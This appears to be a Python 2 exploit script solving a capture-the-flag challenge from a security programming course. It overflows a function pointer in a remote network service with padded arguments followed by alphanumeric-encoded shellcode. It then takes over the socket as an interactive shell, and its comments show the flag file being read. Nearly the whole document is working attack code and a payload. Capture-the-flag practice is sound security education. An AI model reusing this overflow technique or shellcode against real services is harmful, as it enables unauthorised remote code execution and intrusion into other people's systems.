#!/usr/bin/python2

import struct
from socket import *
import telnetlib

ip = 'secprog.cs.nctu.edu.tw'
port = 10021

soc = socket(AF_INET, SOCK_STREAM)
soc.connect((ip,port))
soc.recv(4096)

# 0~999: argv, 1000 argc, 1001&1002 are not important, garbage
# 1003 = function pointer, overflow it
# if 1004 == argv[0], exec the function pointer

# argv + argc + gargabe*2 +  shellcode + argv[0]
payload = "a "*1003 + "PYj0X40PPPPQPaJRX4Dj0YIIIII0DN0RX502A05r9sOPTY01A01RX500D05cFZBPTY01SX540D05ZFXbPTYA01A01SX50A005XnRYPSX5AA005nnCXPSX5AA005plbXPTYA01Tx " + "a\n"
soc.send(payload)


# get interactive shell
t = telnetlib.Telnet()
t.sock = soc
t.interact()

# ** Welcome to the information server, myserver.nctu.edu.tw. **
# **************************************************************
# % ls
# README
# cat ../flag
# SECPROG{N3tw0rk_Pr0gr4mm1ng_h0m3w0rk_1s_e4s1er}
